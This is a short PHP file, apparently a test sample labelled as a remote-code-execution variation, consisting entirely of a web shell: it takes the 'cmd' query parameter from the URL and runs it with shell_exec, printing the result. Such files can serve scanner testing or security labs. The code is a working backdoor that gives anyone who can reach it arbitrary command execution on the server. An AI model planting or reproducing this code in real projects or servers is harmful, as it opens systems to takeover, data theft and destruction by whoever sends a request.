<?php
// RCE test variation #1115
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>